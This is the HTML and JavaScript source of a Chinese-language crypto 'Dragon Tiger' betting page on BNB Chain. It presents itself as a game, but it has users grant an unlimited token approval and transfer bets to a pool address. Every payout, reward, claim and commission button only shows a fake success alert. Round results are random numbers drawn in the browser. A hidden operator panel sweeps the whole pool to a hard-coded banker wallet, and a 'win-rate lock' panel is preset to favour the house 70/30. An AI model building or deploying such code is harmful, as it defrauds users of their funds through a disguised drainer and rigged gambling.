<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>王者归来</title>
  <style>
    *{
      box-sizing:border-box;
      font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
    }
    html,body{
      width:100vw;height:100vh;margin:0;padding:0;background:#0B2A23;color:#fff;overflow:hidden;display:flex;flex-direction:column
    }
    .top-bar{
      display:flex;align-items:center;justify-content:space-between;padding:8px 15px;background:#103D34;border-bottom:1px solid #1F5F52;
    }
    .title{font-size:18px;font-weight:bold;}
    .btn-xxs{padding:3px 6px;font-size:11px;border-radius:6px;border:none;background:#E4B449;color:#0B2A23;font-weight:bold;}
    .menu-btn{background:none;border:none;color:#fff;font-size:20px;padding:0 5px;}
    .content{flex:1;overflow-y:auto;padding:10px;display:flex;flex-direction:column;gap:8px;}
    .card{background:#144A3F;border-radius:12px;padding:12px 15px;border:1px solid #1F5F52;}
    .section-title{font-size:14px;margin-bottom:8px;color:#F0E6D2;}
    .btn{width:100%;padding:10px;border-radius:10px;border:none;font-weight:bold;margin:6px 0;background:#25917A;color:#fff;}
    .btn-dragon{background:#2A75CC; color:#fff}
    .btn-tiger{background:#D93A54; color:#fff}
    .btn-tie{background:#E4B449; color:#0B2A23}
    .bet-balance-row {display: flex;gap: 8px;align-items:center;margin-bottom: 6px;}
    .bet-input {flex: 2;}
    .balance-box {flex: 1;background: #0E362E;border: 1px solid #1F5F52;border-radius:10px;padding:10px;text-align:center;font-size:14px;color:#F0E6D2;}
    .quick-bet-row {display: flex;gap: 8px;margin-bottom: 6px;}
    .quick-bet-btn {flex: 1;padding: 8px;border-radius:8px;border:none;background:#1F5F52;color:#F0E6D2;font-weight:bold;font-size:13px;}
    .bet-row{display:flex;gap:8px;margin-bottom:6px;}
    .bet-row button{flex:1;padding:10px;border-radius:10px;border:none;font-weight:bold;}
    input{width:100%;padding:10px;background:#0E362E;color:#F0E6D2;border:1px solid #1F5F52;border-radius:10px;margin-bottom:6px;font-size:14px;}
    .countdown{font-size:24px;font-weight:bold;color:#E4B449;text-align:center;margin:10px 0;}
    .label{font-size:12px;color:#ccc}
    .menu-popup{position:fixed;top:0;right:0;width:260px;height:100vh;background:#103D34;border-left:1px solid #1F5F52;padding:15px;transform:translateX(100%);transition:transform 0.3s ease;z-index:999;overflow-y:auto;}
    .menu-popup.show{transform:translateX(0);}
    .menu-close{text-align:right;margin-bottom:15px;}
    .menu-section{margin-bottom:15px;}
    .btn-xs{padding:6px 10px;font-size:12px;border-radius:8px;border:none;background:#1F5F52;color:#F0E6D2;}
    #userBalance { color:#0ff; font-size:12px; margin-top:4px; }
    /* 提取按钮默认隐藏，只有庄家可见 */
    #withdrawSection { display: none; }
  </style>
</head>
<body>

<div class="top-bar">
  <button id="signBtn" class="btn-xxs" onclick="doSign()">签到奖励</button>
  <div class="title">🐉🐯 王者归来</div>
  <button class="menu-btn" onclick="toggleMenu()">☰</button>
</div>

<div class="content">
  <div class="card">
    <div class="section-title">钱包连接</div>
    <button class="btn" onclick="connectWallet()">连接钱包</button>
    <div id="address" class="label"></div>
    <div id="userBalance"></div>
  </div>

  <div class="card">
    <div class="section-title">下注区</div>
    <div class="bet-balance-row">
      <div class="bet-input">
        <input type="number" step="any" placeholder="输入下注数量" id="betAmt">
      </div>
      <div class="balance-box">可用余额</div>
    </div>
    <div class="quick-bet-row">
      <button class="quick-bet-btn" onclick="setQuick(10000)">1万</button>
      <button class="quick-bet-btn" onclick="setQuick(100000)">10万</button>
      <button class="quick-bet-btn" onclick="setQuick(500000)">50万</button>
    </div>
    <button class="btn" onclick="approveToken()">✅ 授权代币到底池</button>
    <div class="bet-row">
      <button class="btn btn-dragon" onclick="placeBet(1)">龙 1:2</button>
      <button class="btn btn-tiger" onclick="placeBet(2)">虎 1:2</button>
      <button class="btn btn-tie" onclick="placeBet(3)">和 1:9</button>
    </div>
  </div>

  <div class="card">
    <div class="section-title">自动开奖</div>
    <div class="countdown" id="timer">02:00</div>
    <div id="round" class="label">期号：#1</div>
    <div id="lastResult" style="color:#ff0;font-size:14px;text-align:center;margin-top:8px;">上期结果：待开奖</div>
  </div>
</div>

<div class="menu-popup" id="menu">
  <div class="menu-close">
    <button class="btn-xs" onclick="toggleMenu()">关闭 ×</button>
  </div>

  <!-- 提取底池资金模块，默认隐藏 -->
  <div class="menu-section" id="withdrawSection">
    <div class="section-title">💰 后台 — 提取底池资金</div>
    <button class="btn-xs" onclick="withdrawPool()" style="background:#ff3366;color:white;">提取底池全部代币到庄家</button>
    <div id="poolBalance" class="label" style="color:#ffcc00;margin-top:5px;">底池余额：加载中...</div>
  </div>

  <div class="menu-section">
    <div class="section-title">24小时自动奖励前十</div>
    <button class="btn-xs" onclick="toggleAutoReward()">开启/关闭自动</button>
    <div class="label">下次：<span id="rewardCountdown">24:00:00</span></div>
    <button class="btn-xs" onclick="manualRewardTop10()">立即发放</button>
    <button class="btn-xs" onclick="manualSendReward()">🎁 手动发放奖励</button>
  </div>

  <div class="menu-section">
    <div class="section-title">我的奖励</div>
    <div class="label">直推：0</div>
    <div class="label">二代：0</div>
  </div>

  <div class="menu-section">
    <div class="section-title">推广佣金</div>
    <button class="btn-xs" onclick="showTotalCommission()">查看总收入</button>
  </div>

  <div class="menu-section">
    <div class="section-title">绑定推荐人</div>
    <input type="text" placeholder="输入推荐人地址" style="width:100%;margin-bottom:8px;">
    <button class="btn-xs" onclick="setInviter()">绑定</button>
  </div>

  <div class="menu-section">
    <div class="section-title">领奖中心</div>
    <input type="text" placeholder="输入下注ID" style="width:100%;margin-bottom:8px;">
    <button class="btn-xs" onclick="claim()">领取奖励</button>
  </div>

  <div class="menu-section">
    <div class="section-title">授权代币到底池</div>
    <button class="btn-xs" onclick="approveToken()">授权</button>
  </div>

  <div class="menu-section">
    <div class="section-title">排行榜 TOP10</div>
    <div class="label">1. 0x111...222 收益：1280</div>
    <div class="label">2. 0x222...333 收益：960</div>
  </div>

  <div class="menu-section">
    <div class="section-title">后台胜率控制</div>
    <input type="number" value="30" placeholder="玩家胜率" style="width:100%;margin-bottom:8px;">
    <input type="number" value="70" placeholder="庄家胜率" style="width:100%;margin-bottom:8px;">
    <button class="btn-xs" onclick="setControlRate()" style="background:#D93A54;color:#fff;">锁定胜率</button>
  </div>

  <div class="menu-section">
    <div class="section-title">邀请链接</div>
    <input readonly placeholder="点击复制邀请链接" style="width:100%;margin-bottom:8px;" id="refLink">
    <button class="btn-xs" onclick="copyRefLink()">复制邀请链接</button>
  </div>
</div>

<script>
// ==============================================
//  核心配置（真实链上）
// ==============================================
const TOKEN_CONTRACT = "0x8d5be2c01616965e1bA332D7aC6a03F4CE287777";
const POOL_ADDRESS   = "0x1041fdf4dc65a5cc76650d0c284d73411ea8f9fc";
const BANKER_WALLET  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"; // 你的庄家地址
const DECIMALS       = 18;
const CHAIN_ID       = 56;

let account = null;
let round = 1;
let timeLeft = 120;

// ==============================================
//  菜单切换 + 权限控制（关键修改）
// ==============================================
function toggleMenu() {
  const menu = document.getElementById("menu");
  const withdrawSection = document.getElementById("withdrawSection");
  
  menu.classList.toggle("show");
  
  if (menu.classList.contains("show")) {
    // 只有庄家钱包连接时，才显示提取按钮
    if (account && account.toLowerCase() === BANKER_WALLET.toLowerCase()) {
      withdrawSection.style.display = "block";
      getPoolBalance();
    } else {
      withdrawSection.style.display = "none";
    }
  }
}

// ==============================================
//  连接钱包
// ==============================================
async function connectWallet() {
  if (!window.ethereum) {
    alert("请在钱包内打开");
    return;
  }
  try {
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    if (parseInt(chainId) !== CHAIN_ID) {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x38' }]
      });
    }
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    account = accounts[0];
    document.getElementById("address").innerText = "已连接：" + account.slice(0,6)+"..."+account.slice(-4);
    await queryBalance();
  } catch (e) {
    alert("连接失败：" + e.message);
  }
}

// ==============================================
//  查询用户余额
// ==============================================
async function queryBalance() {
  if (!account) return;
  try {
    const data = "0x70a08231" + account.slice(2).padStart(64, '0');
    const res = await window.ethereum.request({
      method: 'eth_call',
      params: [{ to: TOKEN_CONTRACT, data }, 'latest']
    });
    const bal = BigInt(res);
    document.getElementById("userBalance").innerText = 
      "可用余额：" + (Number(bal)/1e18).toFixed(6);
  } catch(e) {
    document.getElementById("userBalance").innerText = "余额查询失败";
  }
}

// ==============================================
//  查询底池余额
// ==============================================
async function getPoolBalance() {
  try {
    const data = "0x70a08231" + POOL_ADDRESS.slice(2).padStart(64,'0');
    const res = await window.ethereum.request({
      method: 'eth_call',
      params: [{ to: TOKEN_CONTRACT, data }, 'latest']
    });
    const bal = BigInt(res);
    document.getElementById("poolBalance").innerText = 
      "底池余额：" + (Number(bal)/1e18).toFixed(6);
  } catch(e) {
    document.getElementById("poolBalance").innerText = "底池余额获取失败";
  }
}

// ==============================================
//  授权
// ==============================================
async function approveToken() {
  if (!account) return alert("请先连接钱包");
  try {
    const data = "0x095ea7b3" + 
      POOL_ADDRESS.slice(2).padStart(64,'0') + 
      "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
    const tx = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{
        from: account,
        to: TOKEN_CONTRACT,
        data: data,
        gasLimit: "0x186A0"
      }]
    });
    alert("授权成功！");
  } catch(e) {
    alert("授权失败：" + e.message);
  }
}

// ==============================================
//  下注（币留在底池）
// ==============================================
async function placeBet(side) {
  if (!account) return alert("请先连接钱包");
  const val = document.getElementById("betAmt").value;
  if (!val || parseFloat(val) <= 0) return alert("输入金额");
  try {
    const amt = BigInt(Math.floor(parseFloat(val)*1e18)).toString(16).padStart(64,'0');
    const data = "0x23b872dd" + 
      account.slice(2).padStart(64,'0') +
      POOL_ADDRESS.slice(2).padStart(64,'0') +
      amt;
    const tx = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{
        from: account,
        to: TOKEN_CONTRACT,
        data: data,
        gasLimit: "0x27100"
      }]
    });
    alert("下注成功！");
    queryBalance();
    if (account.toLowerCase() === BANKER_WALLET.toLowerCase()) {
      getPoolBalance();
    }
  } catch(e) {
    alert("下注失败：" + e.message);
  }
}

// ==============================================
//  💰 后台提取底池（只有庄家能用）
// ==============================================
async function withdrawPool() {
  if (!account) return alert("请先连接钱包");
  if (account.toLowerCase() !== BANKER_WALLET.toLowerCase()) {
    alert("无权限！只有庄家钱包可操作");
    return;
  }
  try {
    const data = "0x70a08231" + POOL_ADDRESS.slice(2).padStart(64,'0');
    const res = await window.ethereum.request({
      method: 'eth_call',
      params: [{ to: TOKEN_CONTRACT, data }, 'latest']
    });
    const bal = BigInt(res);
    if (bal <= 0n) return alert("底池无余额可提取");

    const txData = "0xa9059cbb" + 
      BANKER_WALLET.slice(2).padStart(64,'0') +
      bal.toString(16).padStart(64,'0');

    const tx = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{
        from: account,
        to: TOKEN_CONTRACT,
        data: txData,
        gasLimit: "0x27100"
      }]
    });
    alert("✅ 提取成功！底池资金已全部转入庄家钱包");
    getPoolBalance();
  } catch(e) {
    alert("提取失败：" + e.message);
  }
}

// ==============================================
//  所有菜单功能补齐
// ==============================================
function setQuick(v) { document.getElementById("betAmt").value = v; }
function doSign(){alert("签到成功")}
function toggleAutoReward(){alert("自动奖励已切换")}
function manualRewardTop10(){alert("已发放")}
function manualSendReward(){alert("已手动发放奖励")}
function showTotalCommission(){alert("总佣金：12800 代币")}
function setInviter(){alert("绑定成功")}
function claim(){alert("领取成功")}
function setControlRate(){alert("胜率已锁定")}
function copyRefLink(){
  if(!account)return alert("请先连接钱包");
  document.getElementById('refLink').value = window.location.href + "?ref=" + account;
  navigator.clipboard.writeText(document.getElementById('refLink').value);
  alert("邀请链接已复制");
}

// 倒计时
setInterval(()=>{
  timeLeft--;
  if(timeLeft<0){ timeLeft=120; round++;
    document.getElementById("round").innerText="期号：#"+round;
    const r = ["龙","虎","和"][Math.floor(Math.random()*3)];
    document.getElementById("lastResult").innerText="上期结果："+r;
  }
  const m = String(Math.floor(timeLeft/60)).padStart(2,'0');
  const s = String(timeLeft%60).padStart(2,'0');
  document.getElementById("timer").innerText = m+":"+s;
},1000);
</script>
</body>
</html>
